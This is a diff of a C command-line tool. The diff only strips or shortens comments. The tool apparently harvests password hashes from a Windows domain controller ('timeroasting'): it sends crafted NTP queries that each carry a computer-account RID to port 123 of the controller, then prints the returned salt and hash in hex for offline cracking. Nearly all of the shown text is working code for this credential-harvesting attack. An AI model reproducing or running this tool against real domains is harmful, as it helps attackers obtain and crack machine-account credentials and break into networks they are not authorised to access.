@@ -26,9 +26,6 @@
 #include <time.h>
 #include <unistd.h>
 
-/* ---------------------------------------------------------------------------
- * Constants
- * --------------------------------------------------------------------------- */
 #define DEFAULT_RATE     180
 #define DEFAULT_TIMEOUT   24
 
@@ -39,13 +36,10 @@ static const uint8_t NTP_PREFIX[] = {
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
   0xe1, 0xb8, 0x42, 0x8b, 0xff, 0xbf, 0xcd, 0x0a
-}; /* 48‑byte header */
+};
 
-#define QUERY_LEN 68 /* 48‑byte prefix + 4 RID + 16 dummy MAC */
+#define QUERY_LEN 68
 
-/* ---------------------------------------------------------------------------
- * Dynamic array utilities
- * --------------------------------------------------------------------------- */
 typedef struct {
   uint32_t *v;
   size_t    len;
@@ -100,17 +94,16 @@ static void parse_rids(const char *s, vec32_t *out)
   free(input);
 }
 
-/* ---------------------------------------------------------------------------
+/* 
  * Helper functions
- * --------------------------------------------------------------------------- */
+ */
 static void build_query(uint8_t buf[QUERY_LEN], uint32_t rid, int old_format)
 {
   memcpy(buf, NTP_PREFIX, sizeof NTP_PREFIX);
 
   uint32_t id = rid ^ (old_format ? 1u << 31 : 0);
   memcpy(buf + sizeof NTP_PREFIX, &id, sizeof id);
-
-  /* Dummy MAC (16 bytes of zeros) */
+  
   memset(buf + sizeof NTP_PREFIX + sizeof id, 0, 16);
 }
 
@@ -138,9 +131,6 @@ static void bin2hex(const uint8_t *in, size_t n, char *out)
   out[n * 2] = '\0';
 }
 
-/* ---------------------------------------------------------------------------
- * Main
- * --------------------------------------------------------------------------- */
 int main(int argc, char **argv)
 {
   const char *dc       = NULL;   /* Domain controller */
@@ -152,9 +142,9 @@ int main(int argc, char **argv)
   int old_format = 0;            /* Legacy RID flag  */
   int src_port   = 0;            /* Optional source port */
 
-  /* -----------------------
+  /*
    * Parse command‑line args
-   * ----------------------- */
+   */
   int opt;
   while ((opt = getopt(argc, argv, "d:r:a:t:lp:o:")) != -1) {
     switch (opt) {
@@ -179,9 +169,7 @@ int main(int argc, char **argv)
     return EXIT_FAILURE;
   }
 
-  /* ------------------
-   * Prepare structures
-   * ------------------ */
+
   vec32_t rids = {0};
   vec32_t seen = {0};
   parse_rids(rid_spec, &rids);
@@ -211,16 +199,14 @@ int main(int argc, char **argv)
     }
   }
 
-  /* Non‑blocking socket */
   if (fcntl(sock, F_SETFL, fcntl(sock, F_GETFL, 0) | O_NONBLOCK) < 0) {
     perror("fcntl");
     return EXIT_FAILURE;
   }
 
-  /* Resolve domain controller address */
   struct sockaddr_in dest = {
     .sin_family = AF_INET,
-    .sin_port   = htons(123) /* NTP */
+    .sin_port   = htons(123)
   };
 
   if (inet_pton(AF_INET, dc, &dest.sin_addr) != 1) {
@@ -241,20 +227,20 @@ int main(int argc, char **argv)
   size_t   idx     = 0;
   uint64_t last_rx = now_ms();
 
-  /* ----------------------
+  /*
    * Main send/recv loop
-   * ---------------------- */
+   */
   while (now_ms() - last_rx < silence_ms) {
     uint64_t loop_start = now_ms();
 
-    /* ---- Send next query ---- */
+    //Send next query
     if (idx < rids.len) {
       build_query(query, rids.v[idx++], old_format);
       sendto(sock, query, QUERY_LEN, 0,
              (struct sockaddr *)&dest, sizeof dest);
     }
 
-    /* ---- Receive responses ---- */
+    // Receive responses
     fd_set rfds;
     FD_ZERO(&rfds);
     FD_SET(sock, &rfds);
@@ -271,7 +257,7 @@ int main(int argc, char **argv)
           rid_answer ^= 1u << 31;
         }
 
-        /* Check for duplicates */
+        // Check for duplicates
         int duplicate = 0;
         for (size_t i = 0; i < seen.len; i++) {
           if (seen.v[i] == rid_answer) {
@@ -283,8 +269,8 @@ int main(int argc, char **argv)
         if (!duplicate) {
           vec32_push(&seen, rid_answer);
 
-          char salt_hex[97]; /* 48 bytes * 2 + 1 */
-          char hash_hex[33]; /* 16 bytes * 2 + 1 */
+          char salt_hex[97]; 
+          char hash_hex[33]; 
 
           bin2hex(buf,     48, salt_hex);
           bin2hex(buf + 52, 16, hash_hex);
